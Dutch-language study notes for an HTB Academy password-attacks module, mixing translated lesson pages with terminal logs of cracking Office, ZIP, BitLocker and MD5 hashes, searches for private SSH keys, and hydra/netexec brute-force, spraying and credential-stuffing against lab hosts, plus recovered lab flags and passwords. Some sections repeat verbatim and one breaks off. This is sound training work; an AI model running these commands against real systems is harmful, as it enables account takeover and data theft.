Alex19980805!
Alex2022!
Alex2023!
August08051998!
August1998!
August1998@
August199808!
August19980805!
August2022!
August2023!
Baseball08051998!
Baseball1998!
Baseball1998@
Baseball199808!
Baseball19980805!
Baseball2022!
Baseball2023!
Bella08051998!
Bella1998!
Bella1998@
Bella199808!
Bella19980805!
Bella2022!
Bella2023!
Maria08051998!
Maria1998!
Maria1998@
Maria199808!
Maria19980805!
Maria2022!
Maria2023!
Mark08051998!
Mark1998!
Mark1998@
Mark199808!
Mark19980805!
Mark2022!
Mark2023!
Nexura08051998!
Nexura1998!
Nexura1998@
Nexura199808!
Nexura19980805!
Nexura2022!
Nexura2023!
White08051998!
White1998!
White1998@
White199808!
White19980805!
White2022!
White2023!
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ hashcat -m 0 97268a8ae45ac7d15c3cea4ce6ea550b mut_mark.list
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Athlon 3000G with Radeon Vega Graphics, 2930/5861 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (4738 MB free)

Dictionary cache built:
* Filename..: mut_mark.list
* Passwords.: 56
* Bytes.....: 717
* Keyspace..: 56
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Hashcat is expecting at least 2048 base words but only got 2.7% of that.
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

97268a8ae45ac7d15c3cea4ce6ea550b:Baseball1998!            
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 97268a8ae45ac7d15c3cea4ce6ea550b
Time.Started.....: Tue Feb 17 05:31:40 2026 (0 secs)
Time.Estimated...: Tue Feb 17 05:31:40 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (mut_mark.list)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:    21699 H/s (0.02ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 56/56 (100.00%)
Rejected.........: 0/56 (0.00%)
Restore.Point....: 0/56 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Alex08051998! -> White2023!
Hardware.Mon.#01.: Util: 58%

Started: Tue Feb 17 05:31:39 2026
Stopped: Tue Feb 17 05:31:42 2026



Hier is de vertaling van pagina 6 van de module Password Attacks, waarin het kraken van beveiligde bestanden centraal staat.
Pagina 6: Beveiligde bestanden kraken

Het versleutelen van bestanden wordt vaak verwaarloosd, zowel privé als zakelijk. Ondanks wetgeving zoals de AVG (GDPR), worden gevoelige documenten (contracten, sollicitaties) vaak onversleuteld verzonden. Wanneer werknemers bestanden wél beveiligen, gebeurt dit vaak met symmetrische encryptie (zoals AES-256), waarbij hetzelfde wachtwoord wordt gebruikt voor versleutelen en ontsleutelen.
Jagen op versleutelde bestanden

Je kunt op een Linux-systeem zoeken naar veelvoorkomende bestandsextensies die vaak versleuteld zijn (zoals .odt, .pdf, .docx) met het volgende commando:
Bash

for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*"); do 
  echo -e "\nExtensie: " $ext; 
  find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core"; 
done

SSH-sleutels vinden

SSH-sleutels hebben niet altijd een standaard extensie. Je kunt ze herkennen aan de inhoud (de "header"). Een private key begint altijd met -----BEGIN [...] PRIVATE KEY-----. Je kunt ze vinden met grep:
Bash

grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null

Sommige SSH-sleutels zijn beveiligd met een wachtwoordzin (passphrase). Je kunt controleren of een sleutel beveiligd is door hem te proberen te lezen met ssh-keygen:
Bash

ssh-keygen -yf ~/.ssh/id_rsa

Als er om een wachtwoord wordt gevraagd, is de sleutel versleuteld.
Het kraakproces (De "2john" tools)

Om een bestand te kraken, moet je eerst de hash uit het bestand extraheren. John the Ripper (JtR) heeft hiervoor talloze scripts. Je kunt ze vinden met: locate *2john*.
1. SSH-sleutels kraken

Gebruik ssh2john.py om de hash te extraheren en John om hem te kraken:
Bash

ssh2john.py id_rsa > ssh.hash
john --wordlist=rockyou.txt ssh.hash

2. Documenten kraken (Office & PDF)

Voor Microsoft Office-documenten (Word, Excel, etc.) gebruik je office2john.py:
Bash

office2john.py Vertrouwelijk.docx > office.hash
john --wordlist=rockyou.txt office.hash

Voor PDF-bestanden gebruik je pdf2john.py:
Bash

pdf2john.py Document.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash

Oefening: ZIP-archief kraken

Vraag: Download het bijgevoegde ZIP-archief (cracking-protected-files.zip) en kraak het bestand daarin. Wat is het wachtwoord?
Hoe pak je dit aan?

Voor ZIP-bestanden gebruik je de tool zip2john.

    Extract de hash:
    Bash

zip2john cracking-protected-files.zip > zip.hash

Kraak de hash:
Bash

john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash

Bekijk het resultaat:
Bash

    john zip.hash --show

Pagina 6: Beveiligde bestanden kraken

Het versleutelen van bestanden wordt vaak verwaarloosd, zowel privé als zakelijk. Ondanks wetgeving zoals de AVG (GDPR), worden gevoelige documenten (contracten, sollicitaties) vaak onversleuteld verzonden. Wanneer werknemers bestanden wél beveiligen, gebeurt dit vaak met symmetrische encryptie (zoals AES-256), waarbij hetzelfde wachtwoord wordt gebruikt voor versleutelen en ontsleutelen.
Jagen op versleutelde bestanden

Je kunt op een Linux-systeem zoeken naar veelvoorkomende bestandsextensies die vaak versleuteld zijn (zoals .odt, .pdf, .docx) met het volgende commando:
Bash

for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*"); do 
  echo -e "\nExtensie: " $ext; 
  find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core"; 
done

SSH-sleutels vinden

SSH-sleutels hebben niet altijd een standaard extensie. Je kunt ze herkennen aan de inhoud (de "header"). Een private key begint altijd met -----BEGIN [...] PRIVATE KEY-----. Je kunt ze vinden met grep:
Bash

grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null

Sommige SSH-sleutels zijn beveiligd met een wachtwoordzin (passphrase). Je kunt controleren of een sleutel beveiligd is door hem te proberen te lezen met ssh-keygen:
Bash

ssh-keygen -yf ~/.ssh/id_rsa

Als er om een wachtwoord wordt gevraagd, is de sleutel versleuteld.
Het kraakproces (De "2john" tools)

Om een bestand te kraken, moet je eerst de hash uit het bestand extraheren. John the Ripper (JtR) heeft hiervoor talloze scripts. Je kunt ze vinden met: locate *2john*.
1. SSH-sleutels kraken

Gebruik ssh2john.py om de hash te extraheren en John om hem te kraken:
Bash

ssh2john.py id_rsa > ssh.hash
john --wordlist=rockyou.txt ssh.hash

2. Documenten kraken (Office & PDF)

Voor Microsoft Office-documenten (Word, Excel, etc.) gebruik je office2john.py:
Bash

office2john.py Vertrouwelijk.docx > office.hash
john --wordlist=rockyou.txt office.hash

Voor PDF-bestanden gebruik je pdf2john.py:
Bash

pdf2john.py Document.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash

Oefening: ZIP-archief kraken

Vraag: Download het bijgevoegde ZIP-archief (cracking-protected-files.zip) en kraak het bestand daarin. Wat is het wachtwoord?
Hoe pak je dit aan?

Voor ZIP-bestanden gebruik je de tool zip2john.

    Extract de hash:
    Bash

zip2john cracking-protected-files.zip > zip.hash

Kraak de hash:
Bash

john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash

Bekijk het resultaat:
Bash

john zip.hash --show



                                                                                                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ cd Downloads
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Downloads]
└─$ ls                
academy-regular.ovpn  c2d77580-c371-45c4-9af4-e964d8bdeef4.zip
                                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Downloads]
└─$ unzip c2d77580-c371-45c4-9af4-e964d8bdeef4.zip
Archive:  c2d77580-c371-45c4-9af4-e964d8bdeef4.zip
  inflating: Confidential.xlsx       
                                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Downloads]
└─$ office2john.py Confidential.xlsx > excel.hash
office2john.py: command not found
                                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 /usr/share/john/office2john.py Confidential.xlsx > excel.hash
    

(kali㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt excel.hash
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:07 0.02% (ETA: 2026-02-22 14:42) 0g/s 46.20p/s 46.20c/s 46.20C/s marita..braves
beethoven        (Confidential.xlsx)     
1g 0:00:02:46 DONE (2026-02-18 04:30) 0.006017g/s 40.24p/s 40.24c/s 40.24C/s lionheart..beethoven
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

                                                                                        ✅ Gelukt! Het wachtwoord is gekraakt!
Wachtwoord: beethoven
John heeft het gevonden na 2 minuten en 46 seconden:


Hier is de vertaling van pagina 7, die gaat over het kraken van beveiligde archieven en BitLocker-schijven.
Pagina 7: Beveiligde archieven kraken

Naast losse bestanden kom je vaak archieven tegen (zoals ZIP of RAR) die met een wachtwoord zijn beveiligd. Bedrijven gebruiken deze vaak om mappenstructuren intact te houden tijdens het verzenden van gevoelige projectinformatie.
Veelvoorkomende archieftypes

Er zijn honderden formaten. Bekende voorbeelden zijn: .7z, .rar, .zip, .tar.gz, maar ook containerformaten zoals .vhd (virtuele harde schijven), BitLocker, en KeePass databases (.kdbx).
1. ZIP-bestanden kraken

Het proces is identiek aan wat we eerder deden, maar dan met zip2john:
Bash

# 1. Extraheer de hash
zip2john Archief.zip > zip.hash

# 2. Kraak met John
john --wordlist=rockyou.txt zip.hash

2. OpenSSL versleutelde GZIP-bestanden

Soms is een bestand versleuteld met OpenSSL zonder dat de extensie dat verraadt. Gebruik het file commando om dit te checken:
file GZIP.gzip -> geeft aan: openssl enc'd data with salted password.

Omdat OpenSSL veel "false positives" kan geven in John, is het betrouwbaarder om een for-loop in Bash te gebruiken die direct probeert uit te pakken:
Bash

for i in $(cat rockyou.txt); do 
  openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz && echo "Wachtwoord is: $i" && break; 
done

BitLocker-versleutelde schijven kraken

BitLocker is de schijfversleuteling van Microsoft. IT-afdelingen gebruiken soms virtuele harde schijven (.vhd of .vhdx) met BitLocker om gevoelige data op laptops te isoleren.
De hash extraheren

We gebruiken bitlocker2john. Dit levert vaak meerdere hashes op. De belangrijkste voor ons is de gebruikerswachtwoord-hash, die begint met $bitlocker$0$.
Bash

# 1. Haal alle hashes op
bitlocker2john -i Backup.vhd > backup.hashes

# 2. Filter op de wachtwoord-hash (modus 0)
grep "bitlocker\$0" backup.hashes > backup.hash

Kraken met Hashcat

De bijbehorende Hashcat-mode is 22100. Let op: BitLocker is extreem traag om te kraken (zeer veilige AES-encryptie), dus hardware-prestaties zijn hier cruciaal.
Bash

hashcat -a 0 -m 22100 backup.hash /usr/share/wordlists/rockyou.txt

BitLocker-schijven mounten in Linux

Als je het wachtwoord eenmaal hebt, kun je de schijf inzien met dislocker.

    Installeer dislocker: sudo apt-get install dislocker

    Maak mappen aan:
    Bash

sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount

Ontsleutel en mount:
Bash

    # Koppel de VHD als loop-device
    sudo losetup -f -P Backup.vhd

    # Ontsleutel met het gevonden wachtwoord (bijv. 1234qwer)
    sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker

    # Mount het ontsleutelde bestand naar een map
    sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount

Oefening: De VHD-uitdaging

Target: Ga naar http://ip:port/download en download het bestand.

    Vraag 1: In het gedownloade bestand zit een met wachtwoord beveiligde VHD. Wat is het wachtwoord van deze VHD?

        Tip: Gebruik bitlocker2john en daarna Hashcat of John om de $bitlocker$0 hash te kraken.

    Vraag 2: Mount de VHD (met dislocker) en lees de inhoud van flag.txt. Wat is de vlag?


──(kali㉿kali)-[~]
└─$ cd ~/Downloads
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ wget http://154.57.164.80:32613/download -O archive.zip
--2026-02-18 04:48:46--  http://154.57.164.80:32613/download
Connecting to 154.57.164.80:32613... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/octet-stream]
Saving to: ‘archive.zip’

archive.zip                                                    [                    <=>                                                                                                                 ]  60.31M  15.3MB/s    in 4.0s    

2026-02-18 04:48:50 (15.1 MB/s) - ‘archive.zip’ saved [63237414]

                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ unzip archive.zip
Archive:  archive.zip
  inflating: Private.vhd             
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
academy-regular.ovpn  archive.zip  c2d77580-c371-45c4-9af4-e964d8bdeef4.zip  Confidential.xlsx  excel.hash  Private.vhd
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ bitlocker2john -i Private.vhd > backup.hashes

Signature found at 0x10003
Version: 8 
Invalid version, looking for a signature with valid version...

Signature found at 0x2200000
Version: 2 (Windows 7 or later)

VMK entry found at 0x22000bb

VMK encrypted with User Password found at 22000dc
VMK encrypted with AES-CCM

VMK entry found at 0x220019b

VMK encrypted with Recovery Password found at 0x22001bc
Searching AES-CCM from 0x22001d8
Trying offset 0x220026b....
VMK encrypted with AES-CCM!!

Signature found at 0x2956000
Version: 2 (Windows 7 or later)

VMK entry found at 0x29560bb

VMK entry found at 0x295619b

Signature found at 0x30ab000
Version: 2 (Windows 7 or later)

VMK entry found at 0x30ab0bb

VMK entry found at 0x30ab19b
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ grep "bitlocker\$0" backup.hashes > backup.hash
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ cat backup.hash
$bitlocker$0$16$b3c105c7ab7faaf544e84d712810da65$1048576$12$b020fe18bbb1db0103000000$60$e9c6b548788aeff190e517b0d85ada5daad7a0a3f40c4467307011ac17f79f8c99768419903025fd7072ee78b15a729afcf54b8c2e3af05bb18d4ba0
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat -m 22100 backup.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Athlon 3000G with Radeon Vega Graphics, 2930/5861 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 6
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (3493 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$bitlocker$0$16$b3c105c7ab7faaf544e84d712810da65$1048576$12$b020fe18bbb1db0103000000$60$e9c6b548788aeff190e517b0d85ada5daad7a0a3f40c4467307011ac17f79f8c99768419903025fd7072ee78b15a729afcf54b8c2e3af05bb18d4ba0:francisco
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22100 (BitLocker)
Hash.Target......: $bitlocker$0$16$b3c105c7ab7faaf544e84d712810da65$10...8d4ba0
Time.Started.....: Wed Feb 18 04:55:38 2026 (1 min, 4 secs)
Time.Estimated...: Wed Feb 18 04:56:42 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 6-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:        8 H/s (15.19ms) @ Accel:63 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 541/14344385 (0.00%)
Rejected.........: 37/541 (6.84%)
Restore.Point....: 400/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:1047552-1048576
Candidate.Engine.: Device Generator
Candidates.#01...: roberto -> miranda
Hardware.Mon.#01.: Util: 95%

Started: Wed Feb 18 04:54:33 2026
Stopped: Wed Feb 18 04:56:44 2026
                                                                     ✅ Gekraakt!
Wachtwoord: francisco
Dit is het antwoord op vraag 1!


**Vlag gevonden:** `43d95aeed3114a53ac66f01265f9b7af`

**Gebruikte commando's (Log):**

1. **VHD koppelen:** `sudo losetup -f -P Private.vhd`
    
2. **Partitie identificeren:** `sudo fdisk -l Private.vhd` _(Output liet zien dat de BitLocker-data op `/dev/loop0p1` stond)_
    
3. **Ontsleutelen met wachtwoord 'francisco':** `sudo dislocker /dev/loop0p1 -ufrancisco -- /media/bitlocker`
    
4. **Mounten van het virtuele bestand:** `sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount`
    
5. **Uitlezen vlag:** `cat /media/bitlockermount/flag.txt`
    

---

### Wat ging er bijna mis? (Leermoment voor CPTS)

In je log zie ik dat je eerst probeerde te mounten via `/dev/loop0p2`. Dat gaf de foutmelding:

> `[CRITICAL] Failed to open /dev/loop0p2: No such file or directory`

**Waarom?** Als je naar je `fdisk -l` output kijkt, zie je dat er maar **één** partitie is: `Private.vhd1`. In Linux wordt dit bij een loop-device vertaald naar `p1`. Je zocht naar een tweede partitie (`p2`) die simpelweg niet bestond.

### 💡 Tip voor de volgende keer

Als het kopiëren naar mij wel lukt, maar naar Obsidian niet, dan ligt het 100% aan de manier waarop Obsidian omgaat met de "speciale tekens" van de Kali-terminal (die rare blokjes en lijntjes).


Netwerkdiensten (Network Services)

Tijdens penetratietesten kom je in elk netwerk diensten tegen die bedoeld zijn voor het beheren, bewerken of maken van content. Deze diensten draaien met specifieke machtigingen en zijn toegewezen aan specifieke gebruikers. Naast webapplicaties omvatten deze diensten onder andere: FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP en LDAP.

Stel dat we een Windows-server via het netwerk willen beheren. We hebben dan een dienst nodig die ons toegang geeft tot het systeem om commando's uit te voeren of bestanden te openen via een GUI (grafische interface) of de terminal. De meest voorkomende diensten hiervoor zijn RDP, WinRM en SSH.

Al deze diensten maken gebruik van een authenticatiemechanisme met een gebruikersnaam en wachtwoord. Hoewel ze geconfigureerd kunnen worden met certificaten of keys, staan ze in veel gevallen nog op de standaardinstellingen.
WinRM (Windows Remote Management)

WinRM is de Microsoft-implementatie van het WS-Management protocol. Het is een protocol gebaseerd op XML en SOAP voor het beheer van Windows-systemen op afstand. Standaard gebruikt WinRM de TCP-poorten 5985 (HTTP) en 5986 (HTTPS).
NetExec

Een handige tool voor wachtwoordaanvallen op WinRM (en andere protocollen zoals SMB, LDAP, MSSQL) is NetExec (voorheen bekend als CrackMapExec).

Installatie:
Bash

sudo apt-get -y install netexec

Basisgebruik voor WinRM brute forcing:
Bash

netexec winrm 10.129.42.197 -u user.list -p password.list

    Tip: Als je (Pwn3d!) ziet verschijnen, betekent dit dat de inloggegevens correct zijn en dat je waarschijnlijk systeemcommando's kunt uitvoeren.

Evil-WinRM

Om daadwerkelijk een interactieve shell te krijgen via WinRM, gebruiken we Evil-WinRM.
Bash

# Installatie
sudo gem install evil-winrm

# Gebruik
evil-winrm -i 10.129.42.197 -u user -p password

SSH (Secure Shell)

SSH draait standaard op TCP-poort 22. Het gebruikt symmetrische encryptie, asymmetrische encryptie en hashing om verbindingen te beveiligen.
Hydra - SSH

We kunnen Hydra gebruiken om SSH-wachtwoorden te brute forcen:
Bash

hydra -L user.list -P password.list ssh://10.129.42.197

Inloggen via SSH:
Bash

ssh user@10.129.42.197

RDP (Remote Desktop Protocol)

RDP biedt toegang tot de GUI van een Windows-systeem via TCP-poort 3389.
Hydra - RDP
Bash

hydra -L user.list -P password.list rdp://10.129.42.197

xFreeRDP

Om verbinding te maken met een RDP-server vanaf Linux:
Bash

xfreerdp /v:10.129.42.197 /u:user /p:password

SMB (Server Message Block)

SMB wordt gebruikt voor het delen van bestanden en printers in Windows-netwerken (poort 445).
Hydra - SMB
Bash

hydra -L user.list -P password.list smb://10.129.42.197

Let op: Als Hydra een 'invalid reply' geeft, kan het zijn dat de versie te oud is voor SMBv3.
Metasploit (smb_login)

Als alternatief voor Hydra kunnen we de smb_login module in Metasploit gebruiken:
Bash

msfconsole -q
use auxiliary/scanner/smb/smb_login
set user_file user.list
set pass_file password.list
set rhosts 10.129.42.197
run

Bestanden bekijken met NetExec en Smbclient

Met NetExec kun je zien tot welke "shares" (gedeelde mappen) je toegang hebt:
Bash

netexec smb 10.129.42.197 -u "user" -p "password" --shares

Vervolgens kun je verbinding maken met smbclient:
Bash

smbclient -U user \\\\10.129.42.197\\SHARENAME

Samenvatting van commando's voor in je Obsidian:
Dienst	Tool	Commando voorbeeld
WinRM	NetExec	netexec winrm <IP> -u <users> -p <pass>
WinRM	Evil-WinRM	evil-winrm -i <IP> -u <user> -p <pass>
SSH	Hydra	hydra -L <users> -P <pass> ssh://<IP>
RDP	xfreerdp	xfreerdp /v:<IP> /u:<user> /p:<pass>
SMB	NetExec	netexec smb <IP> -u <user> -p <pass> --shares
SMB	smbclient	smbclient -U <user> \\\\<IP>\\<share>


Dit is de vertaling van de HTB Academy-pagina over Password Spraying, Stuffing en Defaults. Ik heb het overzichtelijk voor je ingedeeld zodat je het direct in je aantekeningen kunt gebruiken.
Spraying, Stuffing en Standaardinstellingen
1. Password Spraying

Password spraying is een type brute-force aanval waarbij een aanval probeert om één enkel wachtwoord te gebruiken op veel verschillende gebruikersaccounts.

Deze techniek is erg effectief in omgevingen waar nieuwe gebruikers een standaardwachtwoord krijgen (zoals Welkom01!). In plaats van één account te blokkeren door te veel wachtwoorden te proberen (lockout), probeer je één wachtwoord bij iedereen.

    Voorbeeld: Als je weet dat een bedrijf vaak ChangeMe123! gebruikt voor nieuwe accounts, kun je dit wachtwoord "sprayen" over de hele gebruikerslijst.

    Tool (SMB):
    Bash

    netexec smb 10.100.38.0/24 -u usernames.list -p 'ChangeMe123!'

2. Credential Stuffing

Credential stuffing is een aanval waarbij gestolen inloggegevens (gebruikersnaam:wachtwoord combinaties) van de ene dienst worden gebruikt om toegang te krijgen tot andere diensten. Omdat veel mensen wachtwoorden hergebruiken op verschillende platforms (e-mail, social media, werk), zijn deze aanvallen vaak succesvol.

    Voorbeeld: Als je een lijst hebt uit een database-lek, kun je Hydra gebruiken voor SSH:
    Bash

    hydra -C user_pass.list ssh://10.100.38.23

    (De -C vlag wordt gebruikt voor een bestand dat combinaties bevat in het formaat gebruiker:wachtwoord).

3. Standaardwachtwoorden (Default Credentials)

Veel systemen (routers, firewalls, databases) worden geleverd met standaard inloggegevens. Hoewel beheerders deze moeten wijzigen, gebeurt dat vaak niet.

    Tool: Default Credentials Cheat Sheet (te installeren via pip3).
    Bash

    pip3 install defaultcreds-cheat-sheet
    creds search linksys

    Veelvoorkomende voorbeelden:

        Linksys: admin / admin of admin / <leeg>

        Netgear: admin / password

        D-Link: admin / Admin

🛠️ Opdracht Instructies (Questions)

Doelwit IP: 10.129.13.74
SSH Gegevens: * Gebruiker: sam

    Wachtwoord: B@tm@n2022!

De Vraag:
Log in op de doelmachine met de bovenstaande gegevens en vind de MySQL-inloggegevens. Dien deze in als antwoord (Formaat: <username>:<password>).
Hoe pak je dit aan?

    Log in via SSH:
    Bash

ssh sam@10.129.13.74

(Typ yes als er gevraagd wordt om de vingerafdruk te accepteren en voer het wachtwoord in).

Zoek naar MySQL gegevens:
Omdat je bent ingelogd als sam, moet je op zoek naar configuratiebestanden of scripts waar MySQL inloggegevens in staan. Veelvoorkomende plekken zijn:

    Kijk in de home-directory: ls -la /home/sam

    Zoek naar tekstbestanden: grep -i "user" * of grep -i "password" *

    Kijk naar de geschiedenis: history

    Check de /var/www/html map als er een website draait.

# HTB Academy – Password Attacks: Network Services

**Datum:** 19 februari 2026  
**Target:** 10.129.8.226 (ACADEMY-PWATTACKS-WINSRV)  
**Doel:** Credentials vinden voor WinRM, SSH, RDP en SMB via brute force aanvallen

---

## Voorbereiding

### Wordlists downloaden en uitpakken

De wordlists worden meegeleverd via de HTB Academy pagina als zip-bestand.

bash

```bash
cd ~/Downloads
unzip 3c72cefc-4d6a-413d-ad3e-395431df28bc.zip
ls
# username.list en password.list zijn nu beschikbaar
```

---

## Challenge 1 – SSH

### Brute force met Hydra

bash

````bash
hydra -L ~/Downloads/username.list -P ~/Downloads/password.list ssh://10.129.8.226 -t 4
```

**Resultaat:**
```
[22][ssh] host: 10.129.8.226   login: dennis   password: rockstar
````

### Inloggen via SSH

bash

```bash
ssh dennis@10.129.8.226
# wachtwoord: rockstar
```

### Flag ophalen (Windows machine, dus Windows commando's)

cmd

```cmd
dir Desktop
type Desktop\flag.txt
```

**Flag:** `HTB{Let5R0ck1t}`

---

## Challenge 2 – WinRM

### Brute force met NetExec

De `--continue-on-success` vlag zorgt dat NetExec doorgaat na een treffer.  
`2>/dev/null` filtert de ARC4 deprecation warnings weg.

bash

````bash
netexec winrm 10.129.8.226 -u ~/Downloads/username.list -p ~/Downloads/password.list --continue-on-success 2>/dev/null | grep "+"
```

**Resultaat:**
```
WINRM  10.129.8.226  5985  WINSRV  [+] WINSRV\john:november (Pwn3d!)
````

### Evil-WinRM dependency fix

Evil-WinRM vereist rubyzip versie ~> 2.0. De standaard installatie geeft versie 3.x, wat een conflict geeft.

bash

```bash
sudo gem install rubyzip -v 2.3.2
```

### Inloggen via Evil-WinRM

bash

```bash
evil-winrm -i 10.129.8.226 -u john -p november
```

### Flag ophalen

powershell

```powershell
dir C:\Users\john\Desktop
type C:\Users\john\Desktop\flag.txt
```

**Flag:** `HTB{That5Novemb3r}`

---

## Challenge 3 – RDP

### Brute force met Hydra

bash

```bash
hydra -L ~/Downloads/username.list -P ~/Downloads/password.list rdp://10.129.8.226 -t 4
```

### Inloggen via xFreeRDP

bash

```bash
xfreerdp /v:10.129.8.226 /u:<user> /p:<password>

# CPTS - Network Services: RDP Brute Force

**Module:** Password Attacks — Network Services  
**Tags:** #CPTS #rdp #hydra #brute-force #windows  
**Status:** ✅ Completed  

---

## 🎯 Doelstelling

Vind de gebruiker voor de RDP service en kraak het wachtwoord. Log in en vind de flag.

**Target:** `10.129.17.231`  
**Flag:** `HTB{R3m0t3DeskIsw4yT00easy}`

---

## ⚙️ Aanpak

### Stap 1 — Wordlists downloaden

Download de wordlists van de HTB Academy module pagina (network-services.zip) en uitpakken:
```bash
cd ~/Downloads
unzip network-services.zip
```

---

### Stap 2 — Brute force RDP met Hydra
```bash
hydra -L ~/Downloads/username.list -P ~/Downloads/password.list rdp://10.129.17.231 -t 4 -W 3
```

**Gevonden credentials:**

| Gebruiker | Wachtwoord |
|-----------|------------|
| chris | `789456123` |

> Tip: Gebruik geen `-V` flag, dit vertraagt het proces aanzienlijk.

---

### Stap 3 — Verbinden via RDP
```bash
xfreerdp3 /v:10.129.17.231 /u:chris /p:789456123 /cert:ignore /dynamic-resolution
```

---

### Stap 4 — Flag ophalen

De flag stond als tekstbestand op het bureaublad:
```
C:\Users\chris\Desktop\flag.txt
```

**Flag:** `HTB{R3m0t3DeskIsw4yT00easy}`

---

## 🛠️ Gebruikte Tools

| Tool | Gebruik |
|------|---------|
| `hydra` | Brute force RDP credentials |
| `xfreerdp3` | Verbinding maken via RDP |

---

## 📝 Notities

- RDP draait standaard op poort **3389**
- Hydra's RDP module is experimenteel, gebruik altijd `-t 4 -W 3` om de server niet te overbelasten
